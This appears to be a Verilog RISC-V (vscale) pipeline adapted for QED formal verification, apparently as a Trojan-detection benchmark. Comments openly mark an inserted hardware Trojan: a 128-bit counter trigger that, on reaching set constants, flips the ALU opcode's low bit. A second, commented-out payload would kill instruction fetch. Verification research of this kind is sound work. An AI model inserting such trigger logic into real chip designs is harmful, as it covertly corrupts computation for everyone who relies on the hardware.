`include "vscale/vscale_ctrl_constants.vh"
`include "vscale/vscale_alu_ops.vh"
`include "vscale/rv32_opcodes.vh"
`include "vscale/vscale_csr_addr_map.vh"
`include "vscale/vscale_md_constants.vh"
`include "vscale/vscale_platform_constants.vh"


module toppipe (
		input clk,
		input reset
		);

   wire [`N_EXT_INTS-1:0] ext_interrupts;
   
   wire 		  imem_wait;
   
   wire [`XPR_LEN-1:0] 	  imem_addr;
   
   wire [`XPR_LEN-1:0] 	  imem_rdata;
   
   wire 		  imem_badmem_e;
   wire 		  dmem_wait;
   wire 		  dmem_en;
   wire 		  dmem_wen;
   wire [`MEM_TYPE_WIDTH-1:0] dmem_size;
   wire [`XPR_LEN-1:0] 	      dmem_addr;
   wire [`XPR_LEN-1:0] 	      dmem_wdata_delayed;
   wire [`XPR_LEN-1:0] 	      dmem_rdata;
   wire 		      dmem_badmem_e;
   //			  wire 			    htif_reset;
   wire 		      htif_pcr_req_valid;
   wire 		      htif_pcr_req_ready;
   wire 		      htif_pcr_req_rw;
   wire [`CSR_ADDR_WIDTH-1:0] htif_pcr_req_addr;
   wire [`HTIF_PCR_WIDTH-1:0] htif_pcr_req_data;
   wire 		      htif_pcr_resp_valid;
   wire 		      htif_pcr_resp_ready;
   wire [`HTIF_PCR_WIDTH-1:0] htif_pcr_resp_data;
   

   assign ext_interrupts = 24'b0;

   assign imem_wait = 1'b0;
   assign imem_rdata = 32'b0;
   assign imem_badmem_e = 1'b0;
   assign dmem_wait = 1'b0;
   assign dmem_rdata = 32'b0;
   assign dmem_badmem_e = 1'b0;
   //   assign htif_reset = 1'b0;
   assign htif_pcr_req_valid = 1'b0;
   assign htif_pcr_req_rw = 1'b0;
   assign htif_pcr_req_addr = 12'b0;
   assign htif_pcr_resp_ready = 1'b0;
   assign htif_pcr_req_data = 64'b0;
   
vscale_pipeline vpipe (
		      .clk(clk),
		      .ext_interrupts(ext_interrupts),
                      .reset(reset),
                      .imem_wait(imem_wait),
                      .imem_addr(imem_addr),
                      .imem_rdata(imem_rdata),
                      .imem_badmem_e(imem_badmem_e),
                      .dmem_wait(dmem_wait),
                      .dmem_en(dmem_en),
                      .dmem_wen(dmem_wen),
                      .dmem_size(dmem_size),
                      .dmem_addr(dmem_addr),
                      .dmem_wdata_delayed(dmem_wdata_delayed),
                      .dmem_rdata(dmem_rdata),
                      .dmem_badmem_e(dmem_badmem_e),
                      .htif_reset(reset),
                      .htif_pcr_req_valid(htif_pcr_req_valid),
                      .htif_pcr_req_ready(htif_pcr_req_ready),
                      .htif_pcr_req_rw(htif_pcr_req_rw),
                      .htif_pcr_req_addr(htif_pcr_req_addr),
                      .htif_pcr_req_data(htif_pcr_req_data),
                      .htif_pcr_resp_valid(htif_pcr_resp_valid),
                      .htif_pcr_resp_ready(htif_pcr_resp_ready),
                      .htif_pcr_resp_data(htif_pcr_resp_data)
		      );
   
      
endmodule // toppipe

module vscale_pipeline(
                       input 			    clk,
		       input [`N_EXT_INTS-1:0] 	    ext_interrupts, 
                       input 			    reset,
                       input 			    imem_wait,
                       output [`XPR_LEN-1:0] 	    imem_addr,
                       input [`XPR_LEN-1:0] 	    imem_rdata,
                       input 			    imem_badmem_e,
                       input 			    dmem_wait,
                       output 			    dmem_en,
                       output 			    dmem_wen,
                       output [`MEM_TYPE_WIDTH-1:0] dmem_size,
                       output [`XPR_LEN-1:0] 	    dmem_addr,
                       output [`XPR_LEN-1:0] 	    dmem_wdata_delayed,
                       input [`XPR_LEN-1:0] 	    dmem_rdata,
                       input 			    dmem_badmem_e,
                       input 			    htif_reset,
                       input 			    htif_pcr_req_valid,
                       output 			    htif_pcr_req_ready,
                       input 			    htif_pcr_req_rw,
                       input [`CSR_ADDR_WIDTH-1:0]  htif_pcr_req_addr,
                       input [`HTIF_PCR_WIDTH-1:0]  htif_pcr_req_data,
                       output 			    htif_pcr_resp_valid,
                       input 			    htif_pcr_resp_ready,
                       output [`HTIF_PCR_WIDTH-1:0] htif_pcr_resp_data
                       );

   // assign htif_pcr_req_ready = 0;
   // assign htif_pcr_resp_valid = 0;
   // assign htif_pcr_resp_data = 0;
   
   // function [`XPR_LEN-1:0] store_data;
   //    input [`XPR_LEN-1:0]                          addr;
   //    input [`XPR_LEN-1:0]                          data;
   //    input [`MEM_TYPE_WIDTH-1:0]                   mem_type;
   //    begin
   //       case (mem_type)
   //         `MEM_TYPE_SB : store_data = {4{data[7:0]}};
   //         `MEM_TYPE_SH : store_data = {2{data[15:0]}};
   //         default : store_data = data;
   //       endcase // case (mem_type)
   //    end
   // endfunction // case

   // function [`XPR_LEN-1:0] load_data;
   //    input [`XPR_LEN-1:0]                      addr;
   //    input [`XPR_LEN-1:0]                      data;
   //    input [`MEM_TYPE_WIDTH-1:0]               mem_type;
   //    reg [`XPR_LEN-1:0]                        shifted_data;
   //    reg [`XPR_LEN-1:0]                        b_extend;
   //    reg [`XPR_LEN-1:0]                        h_extend;
   //    begin
   //       shifted_data = data >> {addr[1:0],3'b0};
   //       b_extend = {{24{shifted_data[7]}},8'b0};
   //       h_extend = {{16{shifted_data[15]}},16'b0};
   //       case (mem_type)
   //         `MEM_TYPE_LB : load_data = (shifted_data & `XPR_LEN'hff) | b_extend;
   //         `MEM_TYPE_LH : load_data = (shifted_data & `XPR_LEN'hffff) | h_extend;
   //         `MEM_TYPE_LBU : load_data = (shifted_data & `XPR_LEN'hff);
   //         `MEM_TYPE_LHU : load_data = (shifted_data & `XPR_LEN'hffff);
   //         default : load_data = shifted_data;
   //       endcase // case (mem_type)
   //    end
   // endfunction // case

   wire [`PC_SRC_SEL_WIDTH-1:0]                 PC_src_sel;
   wire [`XPR_LEN-1:0]                          PC_PIF;


   reg [`XPR_LEN-1:0]                           PC_IF;

   wire                                         kill_IF;
   wire                                         stall_IF;


   reg [`XPR_LEN-1:0]                           PC_DX;
   reg [`INST_WIDTH-1:0]                        inst_DX;

   wire                                         kill_DX;
   wire                                         stall_DX;
   wire [`IMM_TYPE_WIDTH-1:0]                   imm_type;
   wire [`XPR_LEN-1:0]                          imm;
   wire [`SRC_A_SEL_WIDTH-1:0]                  src_a_sel;
   wire [`SRC_B_SEL_WIDTH-1:0]                  src_b_sel;
   wire [`REG_ADDR_WIDTH-1:0]                   rs1_addr;
   wire [`XPR_LEN-1:0]                          rs1_data;
   wire [`XPR_LEN-1:0]                          rs1_data_bypassed;
   wire [`REG_ADDR_WIDTH-1:0]                   rs2_addr;
   wire [`XPR_LEN-1:0]                          rs2_data;
   wire [`XPR_LEN-1:0]                          rs2_data_bypassed;
   wire [`ALU_OP_WIDTH-1:0]                     alu_op;
   wire [`XPR_LEN-1:0]                          alu_src_a;
   wire [`XPR_LEN-1:0]                          alu_src_b;
   wire [`XPR_LEN-1:0]                          alu_out;
   wire                                         cmp_true;
   wire                                         bypass_rs1;
   wire                                         bypass_rs2;
   wire [`MEM_TYPE_WIDTH-1:0]                   dmem_type;

   wire                                         md_req_valid;
   wire                                         md_req_ready;
   wire                                         md_req_in_1_signed;
   wire                                         md_req_in_2_signed;
   wire [`MD_OUT_SEL_WIDTH-1:0]                 md_req_out_sel;
   wire [`MD_OP_WIDTH-1:0]                      md_req_op;
   wire                                         md_resp_valid;
   wire [`XPR_LEN-1:0]                          md_resp_result;

   reg [`XPR_LEN-1:0]                           PC_WB;
   reg [`XPR_LEN-1:0]                           alu_out_WB;
//   reg [`XPR_LEN-1:0]                           csr_rdata_WB;
   reg [`XPR_LEN-1:0]                           store_data_WB;

   wire                                         kill_WB;
   wire                                         stall_WB;
   reg [`XPR_LEN-1:0]                           bypass_data_WB;
   wire [`XPR_LEN-1:0]                          load_data_WB;
   reg [`XPR_LEN-1:0]                           wb_data_WB;
   wire [`REG_ADDR_WIDTH-1:0]                   reg_to_wr_WB;
   wire                                         wr_reg_WB;
   wire [`WB_SRC_SEL_WIDTH-1:0]                 wb_src_sel_WB;
   reg [`MEM_TYPE_WIDTH-1:0]                    dmem_type_WB;

   // CSR management
   wire [`CSR_ADDR_WIDTH-1:0]                   csr_addr;
   wire [`CSR_CMD_WIDTH-1:0]                    csr_cmd;
   wire                                         csr_imm_sel;
   wire [`PRV_WIDTH-1:0]                        prv;
   wire                                         illegal_csr_access;
   wire 					interrupt_pending;
   wire 					interrupt_taken;
   wire [`XPR_LEN-1:0]                          csr_wdata;
   wire [`XPR_LEN-1:0]                          csr_rdata;
   wire                                         retire_WB;
   wire                                         exception_WB;
   wire [`ECODE_WIDTH-1:0]                      exception_code_WB;
   wire [`XPR_LEN-1:0]                          handler_PC;
   wire                                         eret;
   wire [`XPR_LEN-1:0]                          epc;

   wire 					dmem_en1;
   wire 					dmem_wen1;
   wire 					eret1;
   wire 					exception_WB1;


// Trojan trigger
   wire [31:0] inst0_trig;  
   wire [31:0] inst1_trig;
   wire [31:0] inst2_trig;
   wire [31:0] inst3_trig;
 
   wire trig1_1;
   wire trig1_2;
   wire trig2_1;
   wire trig2_2;
   wire trig1;
	
// Trojan: set counter value here
   assign inst0_trig = 32'hA0B0C0D0;
   assign inst1_trig = 32'hA1B1C1D1;
   assign inst2_trig = 32'hA2B2C2D2;
   assign inst3_trig = 32'hA3B3C3D3;

   reg [127:0] tcount;
   always @(posedge clk) begin
      if (reset) begin
	 tcount <= 0;
      end
      else begin
	tcount <= tcount + 1;
      end
   end

   assign trig1_1 = (inst0_trig == tcount[31:0]);
   assign trig1_2 = (inst1_trig == tcount[63:32]);
   assign trig2_1 = (inst2_trig == tcount[95:64]);
   assign trig2_2 = (inst3_trig == tcount[127:96]);

   assign   trig1 = trig1_1 && trig1_2 && trig2_1 && trig2_2;

// End Trojan Trigger
   
   
   vscale_ctrl ctrl(
                    .clk(clk),
                    .reset(reset),
                    .inst_DX(inst_DX),
                    .imem_wait(imem_wait),
                    .imem_badmem_e(imem_badmem_e),
                    .dmem_wait(dmem_wait),
                    .dmem_badmem_e(dmem_badmem_e),
                    .cmp_true(cmp_true),
                    .PC_src_sel(PC_src_sel),
                    .imm_type(imm_type),
                    .src_a_sel(src_a_sel),
                    .src_b_sel(src_b_sel),
                    .bypass_rs1(bypass_rs1),
                    .bypass_rs2(bypass_rs2),
                    .alu_op(alu_op),
                    .dmem_en(dmem_en1),
                    .dmem_wen(dmem_wen1),
                    .dmem_size(dmem_size),
                    .dmem_type(dmem_type),
                    .md_req_valid(md_req_valid),
                    .md_req_ready(md_req_ready),
                    .md_req_op(md_req_op),
                    .md_req_in_1_signed(md_req_in_1_signed),
                    .md_req_in_2_signed(md_req_in_2_signed),
                    .md_req_out_sel(md_req_out_sel),
                    .md_resp_valid(md_resp_valid),
                    .wr_reg_WB(wr_reg_WB),
                    .reg_to_wr_WB(reg_to_wr_WB),
                    .wb_src_sel_WB(wb_src_sel_WB),
                    .stall_IF(stall_IF),
                    .kill_IF(kill_IF),
                    .stall_DX(stall_DX),
                    .kill_DX(kill_DX),
                    .stall_WB(stall_WB),
                    .kill_WB(kill_WB),
                    .exception_WB(exception_WB1),
                    .exception_code_WB(exception_code_WB),
                    .retire_WB(retire_WB),
                    .csr_cmd(csr_cmd),
                    .csr_imm_sel(csr_imm_sel),
                    // .illegal_csr_access(illegal_csr_access),
		    // .interrupt_pending(interrupt_pending),
		    // .interrupt_taken(interrupt_taken),
                    // .prv(prv),
                    .illegal_csr_access(1'b0),
		    .interrupt_pending(1'b0),
		    .interrupt_taken(1'b0),
                    .prv(2'b0),
                    .eret(eret1)
                    );

   assign exception_WB = 0;
   assign dmem_en = 0;
   assign dmem_wen = 0;
   assign eret = 0;

// shashank edit abs1
   // vscale_PC_mux PCmux(
   //                     .PC_src_sel(PC_src_sel),
   //                     .inst_DX(inst_DX),
   //                     .rs1_data(rs1_data_bypassed),
   //                     .PC_IF(PC_IF),
   //                     .PC_DX(PC_DX),
   //                     .handler_PC(handler_PC),
   //                     .epc(epc),
   //                     .PC_PIF(PC_PIF)
   //                     );

//   assign imem_addr = PC_PIF;
     assign imem_addr = 0;

   always @(posedge clk) begin
      if (reset) begin
         PC_IF <= `XPR_LEN'h200;
      end else if (~stall_IF) begin
//         PC_IF <= PC_PIF;
	 PC_IF <= 0;
      end
   end

// shashank edit :: add the QED module
   
   wire 		   qed_vld_out;
   wire 		   qed_exec_dup;
   assign qed_exec_dup = 1'b0;
   wire [31:0] 		   qed_ifu_instruction;

   wire 		   qed_stall;
   assign qed_stall = stall_DX | kill_IF ;
		   
   // instruction1 and qed_exec_dup are cutpoints
   qed qed0 ( // Inputs
	    .clk(clk),
            .rst(reset),
            .ena(1'b1),
            //.vld_inst(valid0_d_in),
	    //.vld_inst(1'b1), // can make it 1?
            //.pipeline_empty(1'b1),
            .ifu_qed_instruction(imem_rdata),
	    .exec_dup(qed_exec_dup),
	    .stall_IF(qed_stall),
	    // outputs
            .qed_ifu_instruction(qed_ifu_instruction),
            .vld_out(qed_vld_out));

   wire 		   kill_IF_QED ;
   // Trojan payload 
//   assign kill_IF_QED = kill_IF | (~qed_vld_out) | (trig2 && trig1);
   assign kill_IF_QED = kill_IF | (~qed_vld_out);
   // End Trojan payload
   
// shashank edit   
   // always @(posedge clk) begin
   //    if (reset) begin
   //       PC_DX <= 0;
   //       inst_DX <= `RV_NOP;
   //    end else if (~stall_DX) begin
   //       if (kill_IF) begin
   //          inst_DX <= `RV_NOP;
   //       end else begin
   //          PC_DX <= PC_FF;
   //          inst_DX <= imem_rdata;
   //       end
   //    end
   // end // always @ (posedge hclk)
      
   always @(posedge clk) begin
      if (reset) begin
         PC_DX <= 0;
         inst_DX <= `RV_NOP;
      end else if (~stall_DX) begin
         if (kill_IF_QED) begin      // shashank edit
            inst_DX <= `RV_NOP;
         end else begin
            PC_DX <= PC_IF;
            inst_DX <= qed_ifu_instruction;  // shashank edit
         end
      end
   end // always @ (posedge hclk)

   // shashank end

   assign rs1_addr = inst_DX[19:15];
   assign rs2_addr = inst_DX[24:20];

   vscale_regfile regfile(
                          .clk(clk),
//			  .rst(reset), // shashank edit: I added this signal
                          .ra1(rs1_addr),
                          .rd1(rs1_data),
                          .ra2(rs2_addr),
                          .rd2(rs2_data),
                          .wen(wr_reg_WB),
                          .wa(reg_to_wr_WB),
                          .wd(wb_data_WB)
                          );

   vscale_imm_gen imm_gen(
                          .inst(inst_DX),
                          .imm_type(imm_type),
                          .imm(imm)
                          );

   vscale_src_a_mux src_a_mux(
                              .src_a_sel(src_a_sel),
                              .PC_DX(PC_DX),
                              .rs1_data(rs1_data_bypassed),
                              .alu_src_a(alu_src_a)
                              );

   vscale_src_b_mux src_b_mux(
                              .src_b_sel(src_b_sel),
                              .imm(imm),
                              .rs2_data(rs2_data_bypassed),
                              .alu_src_b(alu_src_b)
                              );

   assign rs1_data_bypassed = bypass_rs1 ? bypass_data_WB : rs1_data;
   assign rs2_data_bypassed = bypass_rs2 ? bypass_data_WB : rs2_data;

   vscale_alu alu(
                  //.op(alu_op),
                  // Trojan Effect
                  .op( (trig1)  ? {alu_op[3:1],1'b1}: alu_op),		  
                  .in1(alu_src_a),
                  .in2(alu_src_b),
                  .out(alu_out)
                  );

   vscale_mul_div md(
                     .clk(clk),
                     .reset(reset),
                     .req_valid(md_req_valid), // md_req_valid =  uses_md;
                     .req_ready(md_req_ready), // mul_state = s_idle
                     .req_in_1_signed(md_req_in_1_signed), // all other inputs are obtained from ctrl logic directly (just some decoding is done)
                     .req_in_2_signed(md_req_in_2_signed),
                     .req_out_sel(md_req_out_sel),
                     .req_op(md_req_op),
                     .req_in_1(rs1_data_bypassed),
                     .req_in_2(rs2_data_bypassed),
                     .resp_valid(md_resp_valid),
                     .resp_result(md_resp_result)
                     );


   assign cmp_true = alu_out[0];


   assign dmem_addr = alu_out;

   always @(posedge clk) begin
      if (reset) begin
`ifndef SYNTHESIS
         PC_WB <= $random;
         store_data_WB <= $random;
         alu_out_WB <= $random;
`endif
      end else if (~stall_WB) begin
         PC_WB <= PC_DX;
         store_data_WB <= rs2_data_bypassed; // not used since lw/sw insts are not used
         alu_out_WB <= alu_out;
//         csr_rdata_WB <= csr_rdata;
         dmem_type_WB <= dmem_type; // not used
      end
   end


   always @(*) begin
      case (wb_src_sel_WB)
//        `WB_SRC_CSR : bypass_data_WB = csr_rdata_WB; // system ops are not considered for SQED
        `WB_SRC_MD : bypass_data_WB = md_resp_result;
        default : bypass_data_WB = alu_out_WB;
      endcase // case (wb_src_sel_WB)
   end

//   assign load_data_WB = load_data(alu_out_WB,dmem_rdata,dmem_type_WB);

   always @(*) begin
      case (wb_src_sel_WB)
        `WB_SRC_ALU : wb_data_WB = bypass_data_WB;
//        `WB_SRC_MEM : wb_data_WB = load_data_WB;
//        `WB_SRC_CSR : wb_data_WB = bypass_data_WB; // system ops are not considered for SQED
        `WB_SRC_MD : wb_data_WB = bypass_data_WB;
        default : wb_data_WB = bypass_data_WB;
      endcase
   end


//   assign dmem_wdata_delayed = store_data(alu_out_WB,store_data_WB,dmem_type_WB);
   assign dmem_wdata_delayed = 0;

   // CSR

   // assign csr_addr = inst_DX[31:20];
   // assign csr_wdata = (csr_imm_sel) ? inst_DX[19:15] : rs1_data_bypassed;

   // vscale_csr_file csr(
   //                     .clk(clk),
   // 		       .ext_interrupts(ext_interrupts),
   //                     .reset(reset),
   //                     .addr(csr_addr),
   // 		       // shashank edit: to break the combinational loop. Changed to not run CSR cmds
   //                     //.cmd(csr_cmd),
   //                     .cmd(3'b0),		       
   // 		       // shashank end
   //                     .wdata(csr_wdata),
   //                     .prv(prv),
   //                     .illegal_access(illegal_csr_access),
   //                     .rdata(csr_rdata),
   //                     .retire(retire_WB),
   //                     .exception(exception_WB),
   //                     .exception_code(exception_code_WB),
   //                     .exception_load_addr(alu_out_WB),
   //                     .exception_PC(PC_WB), // PC_WB is zero after removing PC_mux
   //                     .epc(epc),
   //                     .eret(eret),
   //                     .handler_PC(handler_PC),
   // 		       .interrupt_pending(interrupt_pending),
   // 		       .interrupt_taken(interrupt_taken),
   //                     .htif_reset(htif_reset),
   //                     .htif_pcr_req_valid(htif_pcr_req_valid),
   //                     .htif_pcr_req_ready(htif_pcr_req_ready),
   //                     .htif_pcr_req_rw(htif_pcr_req_rw),
   //                     .htif_pcr_req_addr(htif_pcr_req_addr),
   //                     .htif_pcr_req_data(htif_pcr_req_data),
   //                     .htif_pcr_resp_valid(htif_pcr_resp_valid),
   //                     .htif_pcr_resp_ready(htif_pcr_resp_ready),
   //                     .htif_pcr_resp_data(htif_pcr_resp_data)
   //                     );

   // shashank edit

   // qed_enable logic
   wire chk_en;
   reg [4:0] num_orig_insts; // if width is changed also change it in *_checker.sv
   reg [4:0] num_dup_insts;
   wire      num_orig_commits;
   wire      num_dup_commits;

   wire      is_regfile_we ;
   wire      is_dst_lt16;
   wire      is_dst_0;

   reg [1:0] state_delay;
   reg 	     wait_till_commit_reg;
   wire      wait_till_commit;
   
   assign is_dst_lt16 = (reg_to_wr_WB < 16);
   assign is_regfile_we = (wr_reg_WB == 1);
   assign is_dst_0 = (reg_to_wr_WB == 0);

   // any instruction with destination register as 5'b0 is a NOP so ignore those
   assign num_orig_commits = (is_regfile_we&&is_dst_lt16&&(~is_dst_0)&&(~stall_WB)&&(~kill_WB)) ? 1 : 0;
   
   // note that whenever destination register is 5'b0, it remains the same for both original and 
     // duplicate instructions        
   assign num_dup_commits = (is_regfile_we&&(~is_dst_lt16)&&(~stall_WB)&&(~kill_WB)) ? 1 : 0;

   always @(posedge clk)
     begin
	if (reset || ~wait_till_commit) begin
	   num_orig_insts <= 5'b0;
	   num_dup_insts <= 5'b0;
	end else begin
	   num_orig_insts <= num_orig_insts + {4'b0,num_orig_commits};
	   num_dup_insts <= num_dup_insts + {4'b0,num_dup_commits};
	end
     end
 
   assign chk_en = (num_orig_insts == num_dup_insts);

   // tracking logic to mark QED consistency
   always @(posedge clk) begin
      if (reset) begin
	 state_delay <= 0;
	 wait_till_commit_reg <= 0;
      end else begin
	 if ((state_delay == 0) && ~stall_DX) begin
	    state_delay <= 1;
	 end
	 if (((state_delay == 1) && ~stall_WB)) begin
	    state_delay <= 2;
	 end
	 if (state_delay == 2) begin
	    wait_till_commit_reg <= 1;
	 end
      end // else: !if(reset)
   end // always @ (posedge clk)
   assign wait_till_commit = (state_delay == 2);
   
   
   // shashank end


endmodule // vscale_pipeline
